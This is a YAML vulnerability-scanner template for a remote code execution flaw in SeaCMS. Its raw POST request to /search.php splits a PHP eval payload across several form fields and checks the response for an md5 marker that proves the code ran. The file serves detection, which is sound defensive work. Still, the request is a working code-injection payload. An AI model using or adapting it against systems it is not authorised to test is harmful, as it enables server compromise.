id: seacms-rce-ct-530965
info:
  name: SeaCMS Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for a Remote Code Execution (RCE) vulnerability in SeaCMS.
    It attempts to execute a command that calculates an MD5 hash and verifies its presence in the response.
  reference:
    - https://www.jianshu.com/p/8d878330a42f
variables:
  rand: "{{rand_int(2000000000, 2100000000)}}"
http:
  - raw:
      - |
        POST /search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchtype=5&searchword=if{{rand}}&year=:e{{rand}}&area=v{{rand}}&letter=al{{rand}}&yuyan=(join{{rand}}&jq=($_P{{rand}}&&ver=OST[9]))&9[]=prin&9[]=tf(md5({{rand}}));
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "{{rand}}"
        part: body
